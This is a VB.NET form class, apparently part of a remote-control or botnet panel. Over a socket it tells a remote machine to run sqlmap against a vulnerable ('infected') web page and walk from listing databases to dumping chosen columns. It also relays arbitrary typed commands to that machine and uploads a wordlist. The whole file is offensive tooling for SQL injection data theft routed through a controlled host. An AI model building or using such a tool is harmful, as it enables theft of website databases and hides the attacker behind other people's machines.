Public Class sqlmap
    Public sock As Integer
    'TextBox3 Database name
    'TextBox4 Table name
    'TextBox5 Column name
    'Syntax : Sqlmap.py -u URL --dbs 
    ' ============= Sqlmap.py -u URL -D DATABASE --tables
    ' ============== Sqlmap.py -u URL -D DATABASE -T TABLE --columns 
    ' ============== Sqlmap.py -u URL -D DATABASE -T TABLE -C COLUMN --dump
    Dim Curr As Double = 0.0
    Private A As String()
    Private idx As Integer
    Private it As Integer
   
#Region "Drag"

    Dim posX As Integer
    Dim posY As Integer
    Dim drag As Boolean


    Friend Sub Redirect(ByVal path As String)
        Dim Command As String = "cd " + path
        Main.S.Send(sock, "sqlrs" & Main.Yy & ENB([Command]))
    End Sub
    Private Sub Header_MouseDown(ByVal sender As Object, ByVal e As System.Windows.Forms.MouseEventArgs) Handles Label3.MouseDown
        If e.Button = MouseButtons.Left Then
            drag = True
            posX = Cursor.Position.X - Me.Left
            posY = Cursor.Position.Y - Me.Top
        End If
    End Sub

    Private Sub Header_MouseUp(ByVal sender As Object, ByVal e As System.Windows.Forms.MouseEventArgs) Handles Label3.MouseUp
        drag = False
    End Sub

    Private Sub Header_MouseMove(ByVal sender As Object, ByVal e As System.Windows.Forms.MouseEventArgs) Handles Label3.MouseMove
        If drag Then
            Me.Top = Cursor.Position.Y - posY
            Me.Left = Cursor.Position.X - posX
        End If
        Me.Cursor = Cursors.Default
    End Sub


    Private Sub buttonClos_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles buttonClos.Click

        Main.S.Send(sock, "sqlrsc")
        Me.Close()
    End Sub



#End Region

   

    Private Sub Button1_Click(sender As System.Object, e As System.EventArgs) Handles Button1.Click 'Get tables button
        If TextBox3.Text.Length = 0 Then
            MsgBox("Error : " + "please enter Database name to get Tables inside", MsgBoxStyle.Critical)
        Else
            If T1.Text.Contains(TextBox3.Text) Then
                GetTablesCommand(TextBox3.Text)
            Else
                MsgBox("Error : " + "please enter Valid Database name From Grabbed Databases", MsgBoxStyle.Critical)
            End If

        End If
    End Sub

    Private Sub Button2_Click(sender As System.Object, e As System.EventArgs) Handles Button2.Click 'Get columns button
        If TextBox3.Text.Length = 0 Then
            MsgBox("Error : " + "please enter Database name to get Tables inside", MsgBoxStyle.Critical)
        Else
            If TextBox4.Text.Length = 0 Then
                MsgBox("Error : " + "please enter Table name to get Columns inside", MsgBoxStyle.Critical)
            Else
                If T1.Text.Contains(TextBox3.Text) Then
                    If T1.Text.Contains(TextBox4.Text) Then
                        GetColumnsCommand(TextBox3.Text, TextBox4.Text)
                    Else
                        MsgBox("Error : " + "please enter Valid Table name From Grabbed Tables", MsgBoxStyle.Critical)
                    End If
                Else
                    MsgBox("Error : " + "please enter Valid Database name From Grabbed Databases", MsgBoxStyle.Critical)
                End If
            End If
        End If
    End Sub

    Private Sub Button3_Click(sender As System.Object, e As System.EventArgs) Handles Button3.Click
        If TextBox3.Text.Length = 0 Then
            MsgBox("Error : " + "please enter Database name to get Tables inside", MsgBoxStyle.Critical)
        Else
            If TextBox4.Text.Length = 0 Then
                MsgBox("Error : " + "please enter Table name to get Columns inside", MsgBoxStyle.Critical)
            Else
                If TextBox5.Text.Length = 0 Then
                    MsgBox("Error : " + "please enter Column name to get Data Stored inside", MsgBoxStyle.Critical)
                Else

                    If T1.Text.Contains(TextBox3.Text) Then
                        If T1.Text.Contains(TextBox4.Text) Then
                            If T1.Text.Contains(TextBox5.Text) Then
                                DumpColumn(TextBox3.Text, TextBox4.Text, TextBox5.Text)
                            Else
                                MsgBox("Error : " + "please enter Valid Column name From Grabbed Columns", MsgBoxStyle.Critical)
                            End If
                        Else
                            MsgBox("Error : " + "please enter Valid Table name From Grabbed Tables", MsgBoxStyle.Critical)
                        End If
                    Else
                        MsgBox("Error : " + "please enter Valid Database name From Grabbed Databases", MsgBoxStyle.Critical)
                    End If
                End If
            End If
        End If
    End Sub





#Region "Operators"
    Private Sub GetDatabaseNameCommand(ByVal page As String)
        Dim Command As String = "sqlmap.py -u " + page + " --dbs"
        Main.S.Send(sock, "sqlrs" & Main.Yy & ENB([Command]))
        TextBox1.Enabled = False
    End Sub
    Private Sub GetTablesCommand(ByVal Database As String)
        Dim Command As String = "sqlmap.py -u " + TextBox1.Text + " -D " + Database + " --tables"
        Main.S.Send(sock, "sqlrs" & Main.Yy & ENB([Command]))

    End Sub
    Private Sub GetColumnsCommand(ByVal Database As String, ByVal Table As String)
        Dim Command As String = "sqlmap.py -u " + TextBox1.Text + " -D " + Database + " -T " + Table + " --columns"
        Main.S.Send(sock, "sqlrs" & Main.Yy & ENB([Command]))
    End Sub
    Private Sub DumpColumn(ByVal Database As String, ByVal Table As String, ByVal Column As String)
        Dim Command As String = "sqlmap.py -u " + TextBox1.Text + " -D " + Database + " -T " + Table + " -C " + Column + " --dump"
        Main.S.Send(sock, "sqlrs" & Main.Yy & ENB([Command]))
    End Sub

#End Region

    Private Sub Button9_Click(sender As System.Object, e As System.EventArgs) Handles Button9.Click
        If TextBox1.Text.Length > 10 Then
            If TextBox1.Text.Contains("http") Then 'index.php?id=1
                If TextBox1.Text.Contains("?") Then
                    If TextBox1.Text.Contains("=") Then
                        GetDatabaseNameCommand(TextBox1.Text)
                    Else
                        MsgBox("Error : " + "please enter a Valid infected page URL", MsgBoxStyle.Critical)
                    End If
                Else
                    MsgBox("Error : " + "please enter a Valid infected page URL", MsgBoxStyle.Critical)
                End If
            Else
                MsgBox("Error : " + "please enter a Valid infected page URL", MsgBoxStyle.Critical)
            End If
        Else
            MsgBox("Error : " + "please enter infected page URL", MsgBoxStyle.Critical)
        End If

    End Sub

    Private Sub sqlmap_Load(sender As System.Object, e As System.EventArgs) Handles MyBase.Load
        Me.AllowTransparency = True
        Me.TransparencyKey = Me.BackColor

        Timer1.Start()

    End Sub
    Private Sub T2_KeyDown(ByVal sender As Object, ByVal e As System.Windows.Forms.KeyEventArgs) Handles TextBox2.KeyDown
        Select Case e.KeyCode
            Case Keys.Enter
                Dim text As String = TextBox2.Text
                TextBox2.Text = ""
                e.SuppressKeyPress = True
                Main.S.Send(sock, "sqlrs" & Main.Yy & ENB([text]))
                Exit Select
        End Select
    End Sub

    Private Sub Timer1_Tick(sender As System.Object, e As System.EventArgs) Handles Timer1.Tick
        '541
        If Curr < 540 Then

            Curr += 45.1
            Me.Size = New Size(Me.Width, Curr)

        Else
            Timer1.Stop()
            Loader()
            Reforge()
        End If
    End Sub
    Private Sub Loader()


        Main.S.Send(sock, "redsql")
        Main.S.Send(sock, "getsqlmappath")

    End Sub
    Sub Reforge() '500 --> 250 ---> 40 --> 20   270
        Me.Location = New Point(Screen.PrimaryScreen.WorkingArea.Size.Width / 2 - Me.Width / 2, Screen.PrimaryScreen.WorkingArea.Size.Height / 2 - 270)

        Me.Refresh()
    End Sub

    Private Sub Button5_Click(sender As System.Object, e As System.EventArgs) Handles Button5.Click
        Dim result As Integer = MessageBox.Show("Wordlist file is 4 MB Are you sure to send it ?", "Sqlmap Manager", MessageBoxButtons.YesNo, MessageBoxIcon.Hand)
        If result = DialogResult.No Then

        ElseIf result = DialogResult.Yes Then
            Main.SendWordList(sock)
        End If

    End Sub
End Class